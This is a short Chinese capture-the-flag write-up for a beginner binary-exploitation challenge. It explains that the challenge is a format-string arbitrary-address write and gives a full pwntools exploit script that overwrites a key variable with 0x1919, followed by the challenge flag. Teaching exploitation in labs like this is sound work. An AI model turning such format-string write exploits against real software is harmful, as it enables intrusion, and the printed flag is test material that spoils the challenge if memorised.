# easypwn4
```
nc seclabs.cn 5119

急需pwn哥哥，白给分数了，现在开始学也能做得出来的，加油
```
[pwn4](attachment/pwn4)
## WriteUp

这里先谢个罪，因为本人的粗心，把错误的编译版本丢了上去，这题其实就是单纯的考一个格式化字符串的任意地址写，但由于编译错误导致的截断使题目变得复杂了起来
所以这题的考点在于新生能否快速的掌握pwntools的fmtstr函数来做任意地址写


### EXP
```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
n = process('./pwn4')
key = 0x0804A034
offset = 4
#fmt -> key == 0x1919
n.recvuntil('hey#')
n.sendline('1234')
n.recvuntil('Go?')
payload = fmtstr_payload(offset,{key:0x1919})
#print payload
n.sendline(payload)

n.interactive()
```


## flag

`flag{769da736-f550-11e9-81a8-000c29ad2ad8}`
